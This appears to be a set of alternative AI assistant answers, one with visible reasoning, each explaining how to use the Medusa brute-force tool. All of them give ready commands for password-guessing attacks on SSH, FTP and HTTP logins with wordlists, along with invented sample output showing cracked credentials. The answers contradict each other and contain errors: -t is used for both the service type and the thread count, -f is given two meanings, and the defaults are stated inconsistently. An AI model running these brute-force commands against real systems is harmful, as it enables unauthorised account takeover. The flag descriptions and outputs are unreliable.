# medusa
<think>
Alright, the user is asking about Medusa, a Kali Linux tool, and wants to know how to use it, along with examples and expected output. I remember from the previous context that the user provided information about Hydra, but not Medusa. So, I need to figure out how to explain Medusa based on what I know.

First, I should start by introducing Medusa, mentioning that it's a parallel, modular, brute-force login attack tool for various protocols. It's important to highlight that it's similar to Hydra but has its own features.

Next, I'll outline the installation process. Since it's a Kali Linux tool, it's probably pre-installed, but if not, the user can install it using apt. I'll include the commands for checking installation and installing if necessary.

Then, I'll explain the basic syntax. Medusa's syntax is a bit different from Hydra, so I'll make sure to present it correctly, including options like specifying username, password, and target.

I should include some common options to give the user a quick reference. Options like -u for username, -p for password, -P for password list, -t for threads, etc., are essential.

For the examples, I'll break them down into different use cases. The first example can be SSH brute-forcing with a single username and password list. The second example can cover HTTP form login, which is a bit more complex and requires specifying form parameters. The third example can demonstrate using a username list and password list for FTP. This shows the tool's versatility.

Each example should have the command, an explanation of the options used, and the expected output. The output should look similar to what Medusa produces, indicating successful logins.

I should also mention important considerations, like legal use and performance tuning, to ensure the user is aware of responsible usage and how to optimize their attacks.

Finally, I'll conclude by summarizing Medusa's role as a powerful tool for penetration testing, emphasizing ethical use and authorization.

I need to make sure the explanation is clear, step-by-step, and covers all the user's requirements without repeating the previous context about Hydra. The examples should be practical and the output realistic to help the user understand how Medusa works in real scenarios.
</think>

Medusa is another powerful tool in Kali Linux, similar to Hydra, but it is a parallel, modular, brute-force login attack tool. It supports various protocols, including SSH, FTP, HTTP, and more. Here's how to use Medusa, along with examples and expected output.

### Installation

Medusa is typically pre-installed in Kali Linux. If it's not installed, you can install it using:

```bash
sudo apt install medusa
```

### Basic Syntax

The basic syntax for Medusa is:

```bash
medusa [options] -h <target_host> -t <target_type> -u <username> -p <password>
```

### Common Options

- **-h <target_host>**: Specifies the target host IP or hostname.
- **-t <target_type>**: Specifies the type of service (e.g., ssh, ftp, http, etc.).
- **-u <username>**: Specifies a single username.
- **-p <password>**: Specifies a single password.
- **-U <file>**: Loads usernames from a file.
- **-P <file>**: Loads passwords from a file.
- **-f**: Stops after the first correct password/login pair is found.
- **-t <number>**: Specifies the number of parallel threads (default is 1).

### Examples

#### 1. Brute-forcing SSH with a Single Username and Password List

```bash
medusa -h 192.168.1.100 -t ssh -u admin -P /path/to/passwords.txt
```

- **-h 192.168.1.100**: Target IP address.
- **-t ssh**: Specifies the SSH service.
- **-u admin**: Single username to use.
- **-P /path/to/passwords.txt**: Path to a file containing passwords.

**Expected Output:**

```
[+] Medusa v2.2.1 [http://www.foofus.net] starting at 2023-10-01 12:34:56
[+] Target: 192.168.1.100
[+] Protocol: SSH (ssh)
[+] Credentials: admin / password123
[+] Successfully logged in as admin with password123.
```

#### 2. Brute-forcing HTTP Form Login

For web applications, you may need to specify the form parameters:

```bash
medusa -h 192.168.1.100 -t http -u admin -P /path/to/passwords.txt -m "POST /login.php username=^USER^&password=^PASS^"
```

- **-m "POST /login.php username=^USER^&password=^PASS^"**: Specifies the HTTP POST method and the form parameters. `^USER^` and `^PASS^` are placeholders for the username and password.

**Expected Output:**

```
[+] Medusa v2.2.1 [http://www.foofus.net] starting at 2023-10-01 12:45:23
[+] Target: 192.168.1.100
[+] Protocol: HTTP
[+] Credentials: admin / password456
[+] Successfully logged in as admin with password456.
```

#### 3. Brute-forcing FTP with Username and Password Lists

```bash
medusa -h 192.168.1.100 -t ftp -U /path/to/usernames.txt -P /path/to/passwords.txt
```

- **-U /path/to/usernames.txt**: Path to a file containing usernames.
- **-P /path/to/passwords.txt**: Path to a file containing passwords.

**Expected Output:**

```
[+] Medusa v2.2.1 [http://www.foofus.net] starting at 2023-10-01 12:56:12
[+] Target: 192.168.1.100
[+] Protocol: FTP
[+] Credentials: ftpuser / ftppass
[+] Successfully logged in as ftpuser with ftppass.
```

### Important Considerations

- **Legal Use**: Always ensure you have permission to test the systems you are targeting. Unauthorized access is illegal and unethical.
- **Performance**: Medusa can run multiple threads in parallel, which speeds up the cracking process. Use the `-t` option to control the number of threads.

### Conclusion

Medusa is a powerful tool for conducting brute-force attacks on various services. By understanding its syntax and options, you can effectively test the strength of passwords on your network. Always use Medusa responsibly and within the bounds of the law.
                            ALTERNATIVE
Medusa is another powerful password-cracking tool available in Kali Linux, designed for performing brute-force attacks on various protocols. Here’s how to use it, along with examples and expected output.

### Installation

Medusa is usually pre-installed on Kali Linux. To check if it's installed, run:

```bash
which medusa
```

If it's not installed, you can install it using:

```bash
sudo apt install medusa
```

### Basic Syntax

The basic syntax for using Medusa is:

```bash
medusa -h [target] -u [username] -P [password_file] -M [module]
```

### Common Protocols

Medusa supports various protocols, including:

- SSH
- FTP
- HTTP
- MySQL
- VNC

### Usage Examples

#### 1. Brute-forcing SSH

```bash
medusa -h target_ip -u username -P /path/to/passwords.txt -M ssh
```

- **`-h`**: Specifies the target IP address.
- **`-u`**: Specifies the username.
- **`-P`**: Specifies the path to a file containing passwords.
- **`-M`**: Specifies the module (in this case, `ssh`).

**Expected Output:**

```
[+] Login successful: username:password123
```

#### 2. Brute-forcing FTP

```bash
medusa -h target_ip -u admin -P /path/to/passwords.txt -M ftp
```

**Expected Output:**

```
[+] Login successful: admin:admin123
```

#### 3. Brute-forcing HTTP Form Authentication

For web applications, you may need to specify the form parameters:

```bash
medusa -h target_ip -u username -P /path/to/passwords.txt -M http -f "username=^USER^&password=^PASS^"
```

**Expected Output:**

```
[+] Login successful: username:password456
```

### Options

- **`-t <number>`**: Specifies the number of concurrent tasks (default is 16).
- **`-v`**: Enables verbose mode to show more details during the attack.
- **`-o <output_file>`**: Saves the found credentials to a file.

### Conclusion

Medusa is a versatile tool for brute-forcing passwords across a variety of protocols. Always ensure you have permission to test the systems you are targeting, as unauthorized access is illegal.


                           ALTERNATIVE
## Using Medusa on Kali Linux

Medusa is a parallel, modular, and login brute-forcing tool designed for speed and flexibility. It supports numerous protocols, making it a valuable tool for penetration testers.

### Installation

Medusa is typically pre-installed on Kali Linux. To check if it's installed, run:

```bash
which medusa
```

If it’s not installed, you can install it using:

```bash
sudo apt install medusa
```

### Basic Syntax

The basic syntax for using Medusa is:

```bash
medusa -h <target> -u <username> -P <password_file> -M <module>
```

### Common Protocols

Medusa supports various protocols, including:

- FTP
- SSH
- HTTP
- MySQL
- VNC

### Usage Examples

#### 1. Brute-Forcing SSH

To brute-force SSH logins:

```bash
medusa -h <target_ip> -u username -P /path/to/passwords.txt -M ssh
```

**Example:**

```bash
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
```

**Expected Output:**

```
[ssh] host: 192.168.1.100   login: admin   password: password123
```

#### 2. Brute-Forcing FTP

To brute-force FTP logins:

```bash
medusa -h <target_ip> -u username -P /path/to/passwords.txt -M ftp
```

**Example:**

```bash
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

**Expected Output:**

```
[ftp] host: 192.168.1.100   login: admin   password: admin123
```

#### 3. Brute-Forcing HTTP Basic Authentication

For web applications:

```bash
medusa -h <target_ip> -u username -P /path/to/passwords.txt -M http
```

**Example:**

```bash
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M http
```

**Expected Output:**

```
[http] host: 192.168.1.100   login: admin   password: mypassword
```

### Important Options

- **`-t <tasks>`**: Number of parallel tasks (default is 16).
- **`-v`**: Verbose mode to show each attempt.
- **`-o <output_file>`**: Saves the found credentials to a file.

### Conclusion

Medusa is a powerful tool for brute-forcing passwords across various services. Always ensure you have permission to test the systems you target, as unauthorized access is illegal.


                                 ALTERNATIVE 
Sure, I'm happy to help you with using the Medusa tool in Kali Linux.

Medusa is another powerful password cracking tool, similar to Hydra, that can be used for brute-force attacks against various network services. Here's how you can use it:

**Basic Syntax**
The basic syntax for using Medusa is:

```
medusa -h <target> -u <username> -P <password_list> -M <module>
```

Some common options include:
- `-h`: Specifies the target host or IP address
- `-u`: Specifies a single username
- `-U`: Specifies a username list file
- `-p`: Specifies a single password
- `-P`: Specifies a password list file
- `-M`: Specifies the module (service) to attack, e.g., `ftp`, `ssh`, `http`, etc.
- `-t`: Specifies the number of parallel threads (default is 16)
- `-f`: Stops the attack after the first valid login is found

**Examples**

1. **SSH Brute-Force Attack**:
   ```
   medusa -h 192.168.1.100 -u admin -P /path/to/password_list.txt -M ssh
   ```
   This command will attempt to brute-force the SSH login on the host at 192.168.1.100 using the username "admin" and the passwords from the provided list.

2. **FTP Brute-Force Attack**:
   ```
   medusa -h 192.168.1.100 -U /path/to/usernames.txt -p Password123 -M ftp
   ```
   This command will attempt to brute-force the FTP login on the host at 192.168.1.100 using the usernames from the provided list and the password "Password123".

3. **HTTP Basic Authentication Brute-Force Attack**:
   ```
   medusa -h 192.168.1.100 -u admin -P /path/to/password_list.txt -M http -s /admin
   ```
   This command will attempt to brute-force the HTTP Basic Authentication on the `/admin` page of the host at 192.168.1.100 using the username "admin" and the passwords from the provided list.

**Example Output**

The output of Medusa will display the successful login credentials, if any, in the following format:

```
[FTP] Host: 192.168.1.100 User: admin Password: Password123 Success.
```

This output indicates that Medusa successfully logged in to the FTP service on the host at 192.168.1.100 using the username "admin" and the password "Password123".

**Important Considerations**
- Always obtain permission before using Medusa or any other security tools.
- Be mindful of legal and ethical implications when using Medusa for penetration testing or security research.
- Use Medusa responsibly and within the bounds of the law.

Let me know if you have any other questions!


                          ALTERNATIVE
  Medusa is a fast, parallel login brute-forcing tool available on Kali Linux that supports multiple protocols such as SSH, FTP, Telnet, HTTP, and many others. Below is an overview of how to use Medusa, including an example and sample output.

---

## Installation

Medusa is typically available in Kali Linux. You can check if it's installed by running:

```bash
which medusa
```

If it's not installed, you can install it with:

```bash
sudo apt install medusa
```

---

## Basic Syntax

The general syntax of Medusa is:

```bash
medusa [OPTIONS] -h <target> -u <username> -P <password_file> -M <module>
```

- **`-h <target>`**: Specifies the target host IP or domain.
- **`-u <username>`**: Specifies a single username to attempt.
- **`-U <user_file>`**: Specifies a file containing a list of usernames.
- **`-p <password>`**: Specifies a single password.
- **`-P <password_file>`**: Specifies a file containing a list of passwords.
- **`-M <module>`**: Specifies the service/module (e.g., ssh, ftp, telnet).

Additional options include:

- **`-t <threads>`**: Number of parallel threads (default is often 1 or 5; adjust based on performance and stability).
- **`-n <port>`**: Specifies a custom port if the service is running on a non-standard port.
- **`-e ns`**: Option to try "no password" and the username as password if desired.

---

## Example: Brute-Forcing SSH Login

Suppose you want to brute-force an SSH login on a target IP address (`192.168.1.100`) using the username `admin` and a wordlist of passwords located at `/path/to/passwords.txt`. The command would be:

```bash
medusa -h 192.168.1.100 -u admin -P /path/to/passwords.txt -M ssh -t 4
```

Here:

- **`-t 4`**: Runs 4 parallel threads to speed up the attack.

---

## Sample Expected Output

If Medusa finds valid credentials, you might see output similar to:

```
[INFO]  [SSH] 192.168.1.100:22   login: admin   password: password123
[STATUS] 192.168.1.100:22 - valid pair found
Finished: 1 target found valid, 0 target did not respond
```

If no valid credentials are found, it might display a summary like:

```
[FAIL]  [SSH] 192.168.1.100:22   login: admin   password: password_try1 (failed)
[FAIL]  [SSH] 192.168.1.100:22   login: admin   password: password_try2 (failed)
...
Finished: 0 valid pairs found
```

---

## Additional Considerations

- **Protocols**: Medusa supports various protocols. Replace `-M ssh` with the appropriate module for different services (e.g., `-M ftp`, `-M telnet`, etc.).
- **User Lists**: If you need to test multiple usernames, use the `-U` option with a file that contains a list of usernames.
- **Ethical Use**: Always ensure you have explicit permission before testing any systems with Medusa or any other brute force tool. Unauthorized use can be illegal and unethical.

Medusa is a versatile tool in the penetration tester's toolkit. Experiment with different options and modules based on your testing requirements while adhering to legal and ethical standards.



                               
